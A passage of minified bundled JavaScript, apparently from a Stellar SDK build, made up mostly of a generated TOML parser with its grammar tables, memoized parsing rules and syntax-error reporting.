                                throw ve;
                            return [3, 5];
                        case 5:
                            return de++,
                            [3, 1];
                        case 6:
                            return [2]
                        }
                    })
                })
            }
            ,
            Z
        }();
        _.Server = U
    }(server$2)),
    server$2
}
var federation_server = {}, stellar_toml_resolver = {}, parser, hasRequiredParser;
function requireParser() {
    return hasRequiredParser || (hasRequiredParser = 1,
    parser = function() {
        function _(O, x) {
            function w() {
                this.constructor = O
            }
            w.prototype = x.prototype,
            O.prototype = new w
        }
        function M(O, x, w, b, X, Y) {
            this.message = O,
            this.expected = x,
            this.found = w,
            this.offset = b,
            this.line = X,
            this.column = Y,
            this.name = "SyntaxError"
        }
        _(M, Error);
        function j(O) {
            var x = arguments.length > 1 ? arguments[1] : {}, w = {}, b = {
                start: yi
            }, X = yi, Y = function() {
                return ds
            }, F = w, V = "#", K = {
                type: "literal",
                value: "#",
                description: '"#"'
            }, Q = void 0, ee = {
                type: "any",
                description: "any character"
            }, ae = "[", ne = {
                type: "literal",
                value: "[",
                description: '"["'
            }, oe = "]", ue = {
                type: "literal",
                value: "]",
                description: '"]"'
            }, fe = function(De) {
                vo(Sn("ObjectPath", De, Xr, Fr))
            }, he = function(De) {
                vo(Sn("ArrayPath", De, Xr, Fr))
            }, pe = function(De, ot) {
                return De.concat(ot)
            }, ye = function(De) {
                return [De]
            }, be = function(De) {
                return De
            }, xe = ".", Ae = {
                type: "literal",
                value: ".",
                description: '"."'
            }, Ee = "=", Be = {
                type: "literal",
                value: "=",
                description: '"="'
            }, ce = function(De, ot) {
                vo(Sn("Assign", ot, Xr, Fr, De))
            }, q = function(De) {
                return De.join("")
            }, L = function(De) {
                return De.value
            }, U = '"""', Z = {
                type: "literal",
                value: '"""',
                description: '"\\"\\"\\""'
            }, te = null, se = function(De) {
                return Sn("String", De.join(""), Xr, Fr)
            }, de = '"', re = {
                type: "literal",
                value: '"',
                description: '"\\""'
            }, $ = "'''", ie = {
                type: "literal",
                value: "'''",
                description: `"'''"`
            }, ve = "'", ge = {
                type: "literal",
                value: "'",
                description: `"'"`
            }, Re = function(De) {
                return De
            }, Pe = function(De) {
                return De
            }, Ie = "\\", Te = {
                type: "literal",
                value: "\\",
                description: '"\\\\"'
            }, Le = function() {
                return ""
            }, Ze = "e", $e = {
                type: "literal",
                value: "e",
                description: '"e"'
            }, Ne = "E", qe = {
                type: "literal",
                value: "E",
                description: '"E"'
            }, Ve = function(De, ot) {
                return Sn("Float", parseFloat(De + "e" + ot), Xr, Fr)
            }, lt = function(De) {
                return Sn("Float", parseFloat(De), Xr, Fr)
            }, nt = "+", je = {
                type: "literal",
                value: "+",
                description: '"+"'
            }, Ke = function(De) {
                return De.join("")
            }, Qe = "-", We = {
                type: "literal",
                value: "-",
                description: '"-"'
            }, mt = function(De) {
                return "-" + De.join("")
            }, ct = function(De) {
                return Sn("Integer", parseInt(De, 10), Xr, Fr)
            }, vt = "true", we = {
                type: "literal",
                value: "true",
                description: '"true"'
            }, _e = function() {
                return Sn("Boolean", !0, Xr, Fr)
            }, Ce = "false", st = {
                type: "literal",
                value: "false",
                description: '"false"'
            }, et = function() {
                return Sn("Boolean", !1, Xr, Fr)
            }, tt = function() {
                return Sn("Array", [], Xr, Fr)
            }, He = function(De) {
                return Sn("Array", De ? [De] : [], Xr, Fr)
            }, ke = function(De) {
                return Sn("Array", De, Xr, Fr)
            }, Me = function(De, ot) {
                return Sn("Array", De.concat(ot), Xr, Fr)
            }, Ue = function(De) {
                return De
            }, rt = ",", dt = {
                type: "literal",
                value: ",",
                description: '","'
            }, Et = "{", ft = {
                type: "literal",
                value: "{",
                description: '"{"'
            }, gt = "}", Yt = {
                type: "literal",
                value: "}",
                description: '"}"'
            }, Ct = function(De) {
                return Sn("InlineTable", De, Xr, Fr)
            }, Ot = function(De, ot) {
                return Sn("InlineTableValue", ot, Xr, Fr, De)
            }, Vt = function(De) {
                return "." + De
            }, Pt = function(De) {
                return De.join("")
            }, Bt = ":", xr = {
                type: "literal",
                value: ":",
                description: '":"'
            }, Dt = function(De) {
                return De.join("")
            }, Ft = "T", Mr = {
                type: "literal",
                value: "T",
                description: '"T"'
            }, at = "Z", ze = {
                type: "literal",
                value: "Z",
                description: '"Z"'
            }, Je = function(De, ot) {
                return Sn("Date", new Date(De + "T" + ot + "Z"), Xr, Fr)
            }, ht = function(De, ot) {
                return Sn("Date", new Date(De + "T" + ot), Xr, Fr)
            }, _t = /^[ \t]/, Ge = {
                type: "class",
                value: "[ \\t]",
                description: "[ \\t]"
            }, Ye = `
`, it = {
                type: "literal",
                value: `
`,
                description: '"\\n"'
            }, Fe = "\r", ut = {
                type: "literal",
                value: "\r",
                description: '"\\r"'
            }, wt = /^[0-9a-f]/i, At = {
                type: "class",
                value: "[0-9a-f]i",
                description: "[0-9a-f]i"
            }, St = /^[0-9]/, Tt = {
                type: "class",
                value: "[0-9]",
                description: "[0-9]"
            }, er = "_", Xt = {
                type: "literal",
                value: "_",
                description: '"_"'
            }, pr = function() {
                return ""
            }, or = /^[A-Za-z0-9_\-]/, yr = {
                type: "class",
                value: "[A-Za-z0-9_\\-]",
                description: "[A-Za-z0-9_\\-]"
            }, vr = function(De) {
                return De.join("")
            }, gr = '\\"', Sr = {
                type: "literal",
                value: '\\"',
                description: '"\\\\\\""'
            }, br = function() {
                return '"'
            }, _r = "\\\\", wr = {
                type: "literal",
                value: "\\\\",
                description: '"\\\\\\\\"'
            }, sr = function() {
                return "\\"
            }, dr = "\\b", nr = {
                type: "literal",
                value: "\\b",
                description: '"\\\\b"'
            }, lr = function() {
                return "\b"
            }, fr = "\\t", ir = {
                type: "literal",
                value: "\\t",
                description: '"\\\\t"'
            }, $t = function() {
                return "	"
            }, Nt = "\\n", ar = {
                type: "literal",
                value: "\\n",
                description: '"\\\\n"'
            }, Zt = function() {
                return `
`
            }, Gt = "\\f", ur = {
                type: "literal",
                value: "\\f",
                description: '"\\\\f"'
            }, Tr = function() {
                return "\f"
            }, Or = "\\r", Nr = {
                type: "literal",
                value: "\\r",
                description: '"\\\\r"'
            }, Br = function() {
                return "\r"
            }, Rt = "\\U", Cr = {
                type: "literal",
                value: "\\U",
                description: '"\\\\U"'
            }, Lr = function(De) {
                return yo(De.join(""))
            }, Ur = "\\u", Dr = {
                type: "literal",
                value: "\\u",
                description: '"\\\\u"'
            }, Xe = 0, cr = 0, en = 0, jr = {
                line: 1,
                column: 1,
                seenCR: !1
            }, tn = 0, rn = [], Kt = 0, Qt = {}, pn;
            if ("startRule"in x) {
                if (!(x.startRule in b))
                    throw new Error(`Can't start parsing from rule "` + x.startRule + '".');
                X = b[x.startRule]
            }
            function Xr() {
                return ia(cr).line
            }
            function Fr() {
                return ia(cr).column
            }
            function ia(De) {
                function ot(yt, xt, qt) {
                    var jt, Wt;
                    for (jt = xt; jt < qt; jt++)
                        Wt = O.charAt(jt),
                        Wt === `
` ? (yt.seenCR || yt.line++,
                        yt.column = 1,
                        yt.seenCR = !1) : Wt === "\r" || Wt === "\u2028" || Wt === "\u2029" ? (yt.line++,
                        yt.column = 1,
                        yt.seenCR = !0) : (yt.column++,
                        yt.seenCR = !1)
                }
                return en !== De && (en > De && (en = 0,
                jr = {
                    line: 1,
                    column: 1,
                    seenCR: !1
                }),
                ot(jr, en, De),
                en = De),
                jr
            }
            function hr(De) {
                Xe < tn || (Xe > tn && (tn = Xe,
                rn = []),
                rn.push(De))
            }
            function Oi(De, ot, yt) {
                function xt(Er) {
                    var Ir = 1;
                    for (Er.sort(function(Qr, Gr) {
                        return Qr.description < Gr.description ? -1 : Qr.description > Gr.description ? 1 : 0
                    }); Ir < Er.length; )
                        Er[Ir - 1] === Er[Ir] ? Er.splice(Ir, 1) : Ir++
                }
                function qt(Er, Ir) {
                    function Qr($i) {
                        function zn(Bn) {
                            return Bn.charCodeAt(0).toString(16).toUpperCase()
                        }
                        return $i.replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/\x08/g, "\\b").replace(/\t/g, "\\t").replace(/\n/g, "\\n").replace(/\f/g, "\\f").replace(/\r/g, "\\r").replace(/[\x00-\x07\x0B\x0E\x0F]/g, function(Bn) {
                            return "\\x0" + zn(Bn)
                        }).replace(/[\x10-\x1F\x80-\xFF]/g, function(Bn) {
                            return "\\x" + zn(Bn)
                        }).replace(/[\u0180-\u0FFF]/g, function(Bn) {
                            return "\\u0" + zn(Bn)
                        }).replace(/[\u1080-\uFFFF]/g, function(Bn) {
                            return "\\u" + zn(Bn)
                        })
                    }
                    var Gr = new Array(Er.length), fn, ln, En;
                    for (En = 0; En < Er.length; En++)
                        Gr[En] = Er[En].description;
                    return fn = Er.length > 1 ? Gr.slice(0, -1).join(", ") + " or " + Gr[Er.length - 1] : Gr[0],
                    ln = Ir ? '"' + Qr(Ir) + '"' : "end of input",
                    "Expected " + fn + " but " + ln + " found."
                }
                var jt = ia(yt)
                  , Wt = yt < O.length ? O.charAt(yt) : null;
                return ot !== null && xt(ot),
                new M(qt(ot, Wt),ot,Wt,yt,jt.line,jt.column)
            }
            function yi() {
                var De, ot, yt, xt = Xe * 49 + 0, qt = Qt[xt];
                if (qt)
                    return Xe = qt.nextPos,
                    qt.result;
                for (De = Xe,
                ot = [],
                yt = so(); yt !== w; )
                    ot.push(yt),
                    yt = so();
                return ot !== w && (cr = De,
                ot = Y()),
                De = ot,
                Qt[xt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function so() {
                var De, ot, yt, xt, qt, jt, Wt, Er = Xe * 49 + 1, Ir = Qt[Er];
                if (Ir)
                    return Xe = Ir.nextPos,
                    Ir.result;
                for (De = Xe,
                ot = [],
                yt = Rr(); yt !== w; )
                    ot.push(yt),
                    yt = Rr();
                if (ot !== w)
                    if (yt = uo(),
                    yt !== w) {
                        for (xt = [],
                        qt = Rr(); qt !== w; )
                            xt.push(qt),
                            qt = Rr();
                        if (xt !== w) {
                            for (qt = [],
                            jt = aa(); jt !== w; )
                                qt.push(jt),
                                jt = aa();
                            if (qt !== w) {
                                if (jt = [],
                                Wt = Ln(),
                                Wt !== w)
                                    for (; Wt !== w; )
                                        jt.push(Wt),
                                        Wt = Ln();
                                else
                                    jt = F;
                                jt === w && (jt = Oa()),
                                jt !== w ? (ot = [ot, yt, xt, qt, jt],
                                De = ot) : (Xe = De,
                                De = F)
                            } else
                                Xe = De,
                                De = F
                        } else
                            Xe = De,
                            De = F
                    } else
                        Xe = De,
                        De = F;
                else
                    Xe = De,
                    De = F;
                if (De === w) {
                    if (De = Xe,
                    ot = [],
                    yt = Rr(),
                    yt !== w)
                        for (; yt !== w; )
                            ot.push(yt),
                            yt = Rr();
                    else
                        ot = F;
                    if (ot !== w) {
                        if (yt = [],
                        xt = Ln(),
                        xt !== w)
                            for (; xt !== w; )
                                yt.push(xt),
                                xt = Ln();
                        else
                            yt = F;
                        yt === w && (yt = Oa()),
                        yt !== w ? (ot = [ot, yt],
                        De = ot) : (Xe = De,
                        De = F)
                    } else
                        Xe = De,
                        De = F;
                    De === w && (De = Ln())
                }
                return Qt[Er] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function uo() {
                var De, ot = Xe * 49 + 2, yt = Qt[ot];
                return yt ? (Xe = yt.nextPos,
                yt.result) : (De = aa(),
                De === w && (De = oa(),
                De === w && (De = ii(),
                De === w && (De = lo()))),
                Qt[ot] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function aa() {
                var De, ot, yt, xt, qt, jt, Wt = Xe * 49 + 3, Er = Qt[Wt];
                if (Er)
                    return Xe = Er.nextPos,
                    Er.result;
                if (De = Xe,
                O.charCodeAt(Xe) === 35 ? (ot = V,
                Xe++) : (ot = w,
                Kt === 0 && hr(K)),
                ot !== w) {
                    for (yt = [],
                    xt = Xe,
                    qt = Xe,
                    Kt++,
                    jt = Ln(),
                    jt === w && (jt = Oa()),
                    Kt--,
                    jt === w ? qt = Q : (Xe = qt,
                    qt = F),
                    qt !== w ? (O.length > Xe ? (jt = O.charAt(Xe),
                    Xe++) : (jt = w,
                    Kt === 0 && hr(ee)),
                    jt !== w ? (qt = [qt, jt],
                    xt = qt) : (Xe = xt,
                    xt = F)) : (Xe = xt,
                    xt = F); xt !== w; )
                        yt.push(xt),
                        xt = Xe,
                        qt = Xe,
                        Kt++,
                        jt = Ln(),
                        jt === w && (jt = Oa()),
                        Kt--,
                        jt === w ? qt = Q : (Xe = qt,
                        qt = F),
                        qt !== w ? (O.length > Xe ? (jt = O.charAt(Xe),
                        Xe++) : (jt = w,
                        Kt === 0 && hr(ee)),
                        jt !== w ? (qt = [qt, jt],
                        xt = qt) : (Xe = xt,
                        xt = F)) : (Xe = xt,
                        xt = F);
                    yt !== w ? (ot = [ot, yt],
                    De = ot) : (Xe = De,
                    De = F)
                } else
                    Xe = De,
                    De = F;
                return Qt[Wt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function oa() {
                var De, ot, yt, xt, qt, jt, Wt = Xe * 49 + 4, Er = Qt[Wt];
                if (Er)
                    return Xe = Er.nextPos,
                    Er.result;
                if (De = Xe,
                O.charCodeAt(Xe) === 91 ? (ot = ae,
                Xe++) : (ot = w,
                Kt === 0 && hr(ne)),
                ot !== w) {
                    for (yt = [],
                    xt = Rr(); xt !== w; )
                        yt.push(xt),
                        xt = Rr();
                    if (yt !== w)
                        if (xt = Aa(),
                        xt !== w) {
                            for (qt = [],
                            jt = Rr(); jt !== w; )
                                qt.push(jt),
                                jt = Rr();
                            qt !== w ? (O.charCodeAt(Xe) === 93 ? (jt = oe,
                            Xe++) : (jt = w,
                            Kt === 0 && hr(ue)),
                            jt !== w ? (cr = De,
                            ot = fe(xt),
                            De = ot) : (Xe = De,
                            De = F)) : (Xe = De,
                            De = F)
                        } else
                            Xe = De,
                            De = F;
                    else
                        Xe = De,
                        De = F
                } else
                    Xe = De,
                    De = F;
                return Qt[Wt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function ii() {
                var De, ot, yt, xt, qt, jt, Wt, Er, Ir = Xe * 49 + 5, Qr = Qt[Ir];
                if (Qr)
                    return Xe = Qr.nextPos,
                    Qr.result;
                if (De = Xe,
                O.charCodeAt(Xe) === 91 ? (ot = ae,
                Xe++) : (ot = w,
                Kt === 0 && hr(ne)),
                ot !== w)
                    if (O.charCodeAt(Xe) === 91 ? (yt = ae,
                    Xe++) : (yt = w,
                    Kt === 0 && hr(ne)),
                    yt !== w) {
                        for (xt = [],
                        qt = Rr(); qt !== w; )
                            xt.push(qt),
                            qt = Rr();
                        if (xt !== w)
                            if (qt = Aa(),
                            qt !== w) {
                                for (jt = [],
                                Wt = Rr(); Wt !== w; )
                                    jt.push(Wt),
                                    Wt = Rr();
                                jt !== w ? (O.charCodeAt(Xe) === 93 ? (Wt = oe,
                                Xe++) : (Wt = w,
                                Kt === 0 && hr(ue)),
                                Wt !== w ? (O.charCodeAt(Xe) === 93 ? (Er = oe,
                                Xe++) : (Er = w,
                                Kt === 0 && hr(ue)),
                                Er !== w ? (cr = De,
                                ot = he(qt),
                                De = ot) : (Xe = De,
                                De = F)) : (Xe = De,
                                De = F)) : (Xe = De,
                                De = F)
                            } else
                                Xe = De,
                                De = F;
                        else
                            Xe = De,
                            De = F
                    } else
                        Xe = De,
                        De = F;
                else
                    Xe = De,
                    De = F;
                return Qt[Ir] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function Aa() {
                var De, ot, yt, xt = Xe * 49 + 6, qt = Qt[xt];
                if (qt)
                    return Xe = qt.nextPos,
                    qt.result;
                if (De = Xe,
                ot = [],
                yt = ai(),
                yt !== w)
                    for (; yt !== w; )
                        ot.push(yt),
                        yt = ai();
                else
                    ot = F;
                return ot !== w ? (yt = Pi(),
                yt !== w ? (cr = De,
                ot = pe(ot, yt),
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F),
                De === w && (De = Xe,
                ot = Pi(),
                ot !== w && (cr = De,
                ot = ye(ot)),
                De = ot),
                Qt[xt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function Pi() {
                var De, ot, yt, xt, qt, jt = Xe * 49 + 7, Wt = Qt[jt];
                if (Wt)
                    return Xe = Wt.nextPos,
                    Wt.result;
                for (De = Xe,
                ot = [],
                yt = Rr(); yt !== w; )
                    ot.push(yt),
                    yt = Rr();
                if (ot !== w)
                    if (yt = ci(),
                    yt !== w) {
                        for (xt = [],
                        qt = Rr(); qt !== w; )
                            xt.push(qt),
                            qt = Rr();
                        xt !== w ? (cr = De,
                        ot = be(yt),
                        De = ot) : (Xe = De,
                        De = F)
                    } else
                        Xe = De,
                        De = F;
                else
                    Xe = De,
                    De = F;
                if (De === w) {
                    for (De = Xe,
                    ot = [],
                    yt = Rr(); yt !== w; )
                        ot.push(yt),
                        yt = Rr();
                    if (ot !== w)
                        if (yt = Ma(),
                        yt !== w) {
                            for (xt = [],
                            qt = Rr(); qt !== w; )
                                xt.push(qt),
                                qt = Rr();
                            xt !== w ? (cr = De,
                            ot = be(yt),
                            De = ot) : (Xe = De,
                            De = F)
                        } else
                            Xe = De,
                            De = F;
                    else
                        Xe = De,
                        De = F
                }
                return Qt[jt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function ai() {
                var De, ot, yt, xt, qt, jt, Wt, Er = Xe * 49 + 8, Ir = Qt[Er];
                if (Ir)
                    return Xe = Ir.nextPos,
                    Ir.result;
                for (De = Xe,
                ot = [],
                yt = Rr(); yt !== w; )
                    ot.push(yt),
                    yt = Rr();
                if (ot !== w)
                    if (yt = ci(),
                    yt !== w) {
                        for (xt = [],
                        qt = Rr(); qt !== w; )
                            xt.push(qt),
                            qt = Rr();
                        if (xt !== w)
                            if (O.charCodeAt(Xe) === 46 ? (qt = xe,
                            Xe++) : (qt = w,
                            Kt === 0 && hr(Ae)),
                            qt !== w) {
                                for (jt = [],
                                Wt = Rr(); Wt !== w; )
                                    jt.push(Wt),
                                    Wt = Rr();
                                jt !== w ? (cr = De,
                                ot = be(yt),
                                De = ot) : (Xe = De,
                                De = F)
                            } else
                                Xe = De,
                                De = F;
                        else
                            Xe = De,
                            De = F
                    } else
                        Xe = De,
                        De = F;
                else
                    Xe = De,
                    De = F;
                if (De === w) {
                    for (De = Xe,
                    ot = [],
                    yt = Rr(); yt !== w; )
                        ot.push(yt),
                        yt = Rr();
                    if (ot !== w)
                        if (yt = Ma(),
                        yt !== w) {
                            for (xt = [],
                            qt = Rr(); qt !== w; )
                                xt.push(qt),
                                qt = Rr();
                            if (xt !== w)
                                if (O.charCodeAt(Xe) === 46 ? (qt = xe,
                                Xe++) : (qt = w,
                                Kt === 0 && hr(Ae)),
                                qt !== w) {
                                    for (jt = [],
                                    Wt = Rr(); Wt !== w; )
                                        jt.push(Wt),
                                        Wt = Rr();
                                    jt !== w ? (cr = De,
                                    ot = be(yt),
                                    De = ot) : (Xe = De,
                                    De = F)
                                } else
                                    Xe = De,
                                    De = F;
                            else
                                Xe = De,
                                De = F
                        } else
                            Xe = De,
                            De = F;
                    else
                        Xe = De,
                        De = F
                }
                return Qt[Er] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function lo() {
                var De, ot, yt, xt, qt, jt, Wt = Xe * 49 + 9, Er = Qt[Wt];
                if (Er)
                    return Xe = Er.nextPos,
                    Er.result;
                if (De = Xe,
                ot = ci(),
                ot !== w) {
                    for (yt = [],
                    xt = Rr(); xt !== w; )
                        yt.push(xt),
                        xt = Rr();
                    if (yt !== w)
                        if (O.charCodeAt(Xe) === 61 ? (xt = Ee,
                        Xe++) : (xt = w,
                        Kt === 0 && hr(Be)),
                        xt !== w) {
                            for (qt = [],
                            jt = Rr(); jt !== w; )
                                qt.push(jt),
                                jt = Rr();
                            qt !== w ? (jt = oi(),
                            jt !== w ? (cr = De,
                            ot = ce(ot, jt),
                            De = ot) : (Xe = De,
                            De = F)) : (Xe = De,
                            De = F)
                        } else
                            Xe = De,
                            De = F;
                    else
                        Xe = De,
                        De = F
                } else
                    Xe = De,
                    De = F;
                if (De === w)
                    if (De = Xe,
                    ot = Ma(),
                    ot !== w) {
                        for (yt = [],
                        xt = Rr(); xt !== w; )
                            yt.push(xt),
                            xt = Rr();
                        if (yt !== w)
                            if (O.charCodeAt(Xe) === 61 ? (xt = Ee,
                            Xe++) : (xt = w,
                            Kt === 0 && hr(Be)),
                            xt !== w) {
                                for (qt = [],
                                jt = Rr(); jt !== w; )
                                    qt.push(jt),
                                    jt = Rr();
                                qt !== w ? (jt = oi(),
                                jt !== w ? (cr = De,
                                ot = ce(ot, jt),
                                De = ot) : (Xe = De,
                                De = F)) : (Xe = De,
                                De = F)
                            } else
                                Xe = De,
                                De = F;
                        else
                            Xe = De,
                            De = F
                    } else
                        Xe = De,
                        De = F;
                return Qt[Wt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function ci() {
                var De, ot, yt, xt = Xe * 49 + 10, qt = Qt[xt];
                if (qt)
                    return Xe = qt.nextPos,
                    qt.result;
                if (De = Xe,
                ot = [],
                yt = cs(),
                yt !== w)
                    for (; yt !== w; )
                        ot.push(yt),
                        yt = cs();
                else
                    ot = F;
                return ot !== w && (cr = De,
                ot = q(ot)),
                De = ot,
                Qt[xt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function Ma() {
                var De, ot, yt = Xe * 49 + 11, xt = Qt[yt];
                return xt ? (Xe = xt.nextPos,
                xt.result) : (De = Xe,
                ot = Cn(),
                ot !== w && (cr = De,
                ot = L(ot)),
                De = ot,
                De === w && (De = Xe,
                ot = sa(),
                ot !== w && (cr = De,
                ot = L(ot)),
                De = ot),
                Qt[yt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function oi() {
                var De, ot = Xe * 49 + 12, yt = Qt[ot];
                return yt ? (Xe = yt.nextPos,
                yt.result) : (De = qa(),
                De === w && (De = gu(),
                De === w && (De = Ca(),
                De === w && (De = hu(),
                De === w && (De = pu(),
                De === w && (De = po(),
                De === w && (De = mu())))))),
                Qt[ot] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function qa() {
                var De, ot = Xe * 49 + 13, yt = Qt[ot];
                return yt ? (Xe = yt.nextPos,
                yt.result) : (De = is(),
                De === w && (De = Cn(),
                De === w && (De = gi(),
                De === w && (De = sa()))),
                Qt[ot] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function is() {
                var De, ot, yt, xt, qt, jt = Xe * 49 + 14, Wt = Qt[jt];
                if (Wt)
                    return Xe = Wt.nextPos,
                    Wt.result;
                if (De = Xe,
                O.substr(Xe, 3) === U ? (ot = U,
                Xe += 3) : (ot = w,
                Kt === 0 && hr(Z)),
                ot !== w)
                    if (yt = Ln(),
                    yt === w && (yt = te),
                    yt !== w) {
                        for (xt = [],
                        qt = Ta(); qt !== w; )
                            xt.push(qt),
                            qt = Ta();
                        xt !== w ? (O.substr(Xe, 3) === U ? (qt = U,
                        Xe += 3) : (qt = w,
                        Kt === 0 && hr(Z)),
                        qt !== w ? (cr = De,
                        ot = se(xt),
                        De = ot) : (Xe = De,
                        De = F)) : (Xe = De,
                        De = F)
                    } else
                        Xe = De,
                        De = F;
                else
                    Xe = De,
                    De = F;
                return Qt[jt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function Cn() {
                var De, ot, yt, xt, qt = Xe * 49 + 15, jt = Qt[qt];
                if (jt)
                    return Xe = jt.nextPos,
                    jt.result;
                if (De = Xe,
                O.charCodeAt(Xe) === 34 ? (ot = de,
                Xe++) : (ot = w,
                Kt === 0 && hr(re)),
                ot !== w) {
                    for (yt = [],
                    xt = Bi(); xt !== w; )
                        yt.push(xt),
                        xt = Bi();
                    yt !== w ? (O.charCodeAt(Xe) === 34 ? (xt = de,
                    Xe++) : (xt = w,
                    Kt === 0 && hr(re)),
                    xt !== w ? (cr = De,
                    ot = se(yt),
                    De = ot) : (Xe = De,
                    De = F)) : (Xe = De,
                    De = F)
                } else
                    Xe = De,
                    De = F;
                return Qt[qt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function gi() {
                var De, ot, yt, xt, qt, jt = Xe * 49 + 16, Wt = Qt[jt];
                if (Wt)
                    return Xe = Wt.nextPos,
                    Wt.result;
                if (De = Xe,
                O.substr(Xe, 3) === $ ? (ot = $,
                Xe += 3) : (ot = w,
                Kt === 0 && hr(ie)),
                ot !== w)
                    if (yt = Ln(),
                    yt === w && (yt = te),
                    yt !== w) {
                        for (xt = [],
                        qt = Ii(); qt !== w; )
                            xt.push(qt),
                            qt = Ii();
                        xt !== w ? (O.substr(Xe, 3) === $ ? (qt = $,
                        Xe += 3) : (qt = w,
                        Kt === 0 && hr(ie)),
                        qt !== w ? (cr = De,
                        ot = se(xt),
                        De = ot) : (Xe = De,
                        De = F)) : (Xe = De,
                        De = F)
                    } else
                        Xe = De,
                        De = F;
                else
                    Xe = De,
                    De = F;
                return Qt[jt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function sa() {
                var De, ot, yt, xt, qt = Xe * 49 + 17, jt = Qt[qt];
                if (jt)
                    return Xe = jt.nextPos,
                    jt.result;
                if (De = Xe,
                O.charCodeAt(Xe) === 39 ? (ot = ve,
                Xe++) : (ot = w,
                Kt === 0 && hr(ge)),
                ot !== w) {
                    for (yt = [],
                    xt = as(); xt !== w; )
                        yt.push(xt),
                        xt = as();
                    yt !== w ? (O.charCodeAt(Xe) === 39 ? (xt = ve,
                    Xe++) : (xt = w,
                    Kt === 0 && hr(ge)),
                    xt !== w ? (cr = De,
                    ot = se(yt),
                    De = ot) : (Xe = De,
                    De = F)) : (Xe = De,
                    De = F)
                } else
                    Xe = De,
                    De = F;
                return Qt[qt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function Bi() {
                var De, ot, yt, xt = Xe * 49 + 18, qt = Qt[xt];
                return qt ? (Xe = qt.nextPos,
                qt.result) : (De = fs(),
                De === w && (De = Xe,
                ot = Xe,
                Kt++,
                O.charCodeAt(Xe) === 34 ? (yt = de,
                Xe++) : (yt = w,
                Kt === 0 && hr(re)),
                Kt--,
                yt === w ? ot = Q : (Xe = ot,
                ot = F),
                ot !== w ? (O.length > Xe ? (yt = O.charAt(Xe),
                Xe++) : (yt = w,
                Kt === 0 && hr(ee)),
                yt !== w ? (cr = De,
                ot = Re(yt),
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F)),
                Qt[xt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function as() {
                var De, ot, yt, xt = Xe * 49 + 19, qt = Qt[xt];
                return qt ? (Xe = qt.nextPos,
                qt.result) : (De = Xe,
                ot = Xe,
                Kt++,
                O.charCodeAt(Xe) === 39 ? (yt = ve,
                Xe++) : (yt = w,
                Kt === 0 && hr(ge)),
                Kt--,
                yt === w ? ot = Q : (Xe = ot,
                ot = F),
                ot !== w ? (O.length > Xe ? (yt = O.charAt(Xe),
                Xe++) : (yt = w,
                Kt === 0 && hr(ee)),
                yt !== w ? (cr = De,
                ot = Re(yt),
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F),
                Qt[xt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function Ta() {
                var De, ot, yt, xt = Xe * 49 + 20, qt = Qt[xt];
                return qt ? (Xe = qt.nextPos,
                qt.result) : (De = fs(),
                De === w && (De = co(),
                De === w && (De = Xe,
                ot = Xe,
                Kt++,
                O.substr(Xe, 3) === U ? (yt = U,
                Xe += 3) : (yt = w,
                Kt === 0 && hr(Z)),
                Kt--,
                yt === w ? ot = Q : (Xe = ot,
                ot = F),
                ot !== w ? (O.length > Xe ? (yt = O.charAt(Xe),
                Xe++) : (yt = w,
                Kt === 0 && hr(ee)),
                yt !== w ? (cr = De,
                ot = Pe(yt),
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F))),
                Qt[xt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function co() {
                var De, ot, yt, xt, qt, jt = Xe * 49 + 21, Wt = Qt[jt];
                if (Wt)
                    return Xe = Wt.nextPos,
                    Wt.result;
                if (De = Xe,
                O.charCodeAt(Xe) === 92 ? (ot = Ie,
                Xe++) : (ot = w,
                Kt === 0 && hr(Te)),
                ot !== w)
                    if (yt = Ln(),
                    yt !== w) {
                        for (xt = [],
                        qt = ls(); qt !== w; )
                            xt.push(qt),
                            qt = ls();
                        xt !== w ? (cr = De,
                        ot = Le(),
                        De = ot) : (Xe = De,
                        De = F)
                    } else
                        Xe = De,
                        De = F;
                else
                    Xe = De,
                    De = F;
                return Qt[jt] = {
                    nextPos: Xe,
                    result: De
                },
                De
            }
            function Ii() {
                var De, ot, yt, xt = Xe * 49 + 22, qt = Qt[xt];
                return qt ? (Xe = qt.nextPos,
                qt.result) : (De = Xe,
                ot = Xe,
                Kt++,
                O.substr(Xe, 3) === $ ? (yt = $,
                Xe += 3) : (yt = w,
                Kt === 0 && hr(ie)),
                Kt--,
                yt === w ? ot = Q : (Xe = ot,
                ot = F),
                ot !== w ? (O.length > Xe ? (yt = O.charAt(Xe),
                Xe++) : (yt = w,
                Kt === 0 && hr(ee)),
                yt !== w ? (cr = De,
                ot = Re(yt),
                De = ot) : (Xe = De,
                De = F)) : (Xe = De,
                De = F),
                Qt[xt] = {
                    nextPos: Xe,
                    result: De
                },
                De)
            }
            function Ca() {
                var De, ot, yt, xt, qt = Xe * 49 + 23, jt = Qt[qt];
                return jt ? (Xe = jt.nextPos,
                jt.result) : (De = Xe,
                ot = fo(),
                ot === w && (ot = ho()),
                ot !== w ? (O.charCodeAt(Xe) === 101 ? (yt = Ze,
                Xe++) : (yt = w,
                Kt === 0 && hr($e)),
                yt === w && (O.charCodeAt(Xe) === 69 ? (yt = Ne,
